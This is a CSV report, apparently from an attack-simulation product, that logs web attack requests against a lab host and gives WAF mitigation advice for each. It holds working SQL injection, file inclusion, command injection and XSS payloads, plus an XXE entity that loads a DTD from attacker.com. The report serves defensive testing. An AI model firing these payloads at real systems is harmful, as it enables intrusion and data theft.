"Source","Timestamp","Attack Type","URL","Action","Method","Payload","Input Name","Risk","Display URL","Status","Sub Category","Mitigation","Previous Status","Redirected","Full Request","Platform","Database"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:44","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","1 or pg_sleep(0:0:30)--","tel","high","https://ekslabs.cymulatedev.com","blocked","Blind SQL Injection","Create a WAF Security rule to block incoming requests that contains:1 or pg_sleep(0:0:30)--.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Blind SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 315
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""1 or pg_sleep(0:0:30)--"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:44","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\Program Files\Apache Group\Apache2\conf\httpd.conf","N/A","medium","https://ekslabs.cymulatedev.com\Program Files\Apache Group\Apache2\conf\httpd.conf","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\Program Files\Apache Group\Apache2\conf\httpd.conf.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /Program%20Files/Apache%20Group/Apache2/conf/httpd.conf HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:44","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/usr/local/apache/logs/access.log","N/A","medium","https://ekslabs.cymulatedev.com/usr/local/apache/logs/access.log","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:/usr/local/apache/logs/access.log.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /usr/local/apache/logs/access.log HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","linux","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:43","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/ListRecords.php?lib_dir=https://app.cymulate.com?&cmd=id","N/A","medium","https://ekslabs.cymulatedev.com/ListRecords.php?lib_dir=https://app.cymulate.com?&cmd=id","blocked","Remote File Inclusion","Create a WAF Security rule to block incoming requests that contains:/ListRecords.php?lib_dir=https://app.cymulate.com?&cmd=id.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Remote File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /ListRecords.php?lib_dir=https://app.cymulate.com?&cmd=id HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:43","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03it={% For c in [1,2,3]%} {{c, c, c}} {% endfor%}","blocked","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03it={%%20For%20c%20in%20[1,2,3]%}%20{{c,%20c,%20c}}%20{%%20endfor%} HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:43","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","%27+--+","password","high","https://ekslabs.cymulatedev.com","blocked","Passive SQL Injection","Create a WAF Security rule to block incoming requests that contains:%27+--+.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Passive SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 299
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""%27+--+"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:43","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","""><SCRIPTLET> <IMPLEMENTS Type=""Behavior""></IMPLEMENTS><SCRIPT Language=""javascript"">alert(1)</SCRIPT></SCRIPTLET>","hidden","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:""><SCRIPTLET> <IMPLEMENTS Type=""Behavior""></IMPLEMENTS><SCRIPT Language=""javascript"">alert(1)</SCRIPT></SCRIPTLET>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 155
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""\""><SCRIPTLET> <IMPLEMENTS Type=\""Behavior\""></IMPLEMENTS><SCRIPT Language=\""javascript\"">alert(1)</SCRIPT></SCRIPTLET>""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:42","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","| perl -e 'print ""X""x8096'","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03is=| perl -e 'print ""X""x8096'","blocked","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:| perl -e 'print ""X""x8096'.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03is=|%20perl%20-e%20%27print%20%22X%22x8096%27 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:42","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","'><!--<img src=""--><img src=x onerror=alert(1)//"">","password","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:'><!--<img src=""--><img src=x onerror=alert(1)//"">.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 344
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""'><!--<img src=\""--><img src=x onerror=alert(1)//\"">"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:42","XML Injections","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","<?xml version=""1.0""?> <!DOCTYPE data [ <!ENTITY % dtd SYSTEM ""http://attacker.com/evil.dtd""> %dtd; %all;]>","tel","high","https://ekslabs.cymulatedev.com","blocked","XML External Entity (XXE)","Create a WAF Security rule to block incoming requests that contains:<?xml version=""1.0""?> <!DOCTYPE data [ <!ENTITY % dtd SYSTEM ""http://attacker.com/evil.dtd""> %dtd; %all;]>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the XML External Entity (XXE) signature pack (XML Injections)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 402
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""<?xml version=\""1.0\""?> <!DOCTYPE data [ <!ENTITY % dtd SYSTEM \""http://attacker.com/evil.dtd\""> %dtd; %all;]>"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:42","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116","password","high","https://ekslabs.cymulatedev.com","blocked","Generic SQL Injection","Create a WAF Security rule to block incoming requests that contains:1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 386
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:42","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\AppServ\MySQL\data\mysql\user.MYD","N/A","medium","https://ekslabs.cymulatedev.com\AppServ\MySQL\data\mysql\user.MYD","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\AppServ\MySQL\data\mysql\user.MYD.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /AppServ/MySQL/data/mysql/user.MYD HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:41","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post",")) waitfor delay '0:0:20' --","hidden","high","https://ekslabs.cymulatedev.com","blocked","MSSQL Injection","Create a WAF Security rule to block incoming requests that contains:)) waitfor delay '0:0:20' --.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the MSSQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 64
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":"")) waitfor delay '0:0:20' --""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:41","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post",") waitfor delay '0:0:20' /*","hidden","high","https://ekslabs.cymulatedev.com","blocked","MSSQL Injection","Create a WAF Security rule to block incoming requests that contains:) waitfor delay '0:0:20' /*.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the MSSQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 63
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":"") waitfor delay '0:0:20' /*""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:41","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","<script>if(""xx"" == ""xx"") { alert(1);}</script>","tel","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:<script>if(""xx"" == ""xx"") { alert(1);}</script>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 342
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""<script>if(\""xx\"" == \""xx\"") { alert(1);}</script>"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:40","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","ondrop","tel","low","https://ekslabs.cymulatedev.com","penetrated","HTML Events","Create a WAF Security rule to block incoming requests that contains:ondrop.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the HTML Events signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 298
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""ondrop"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
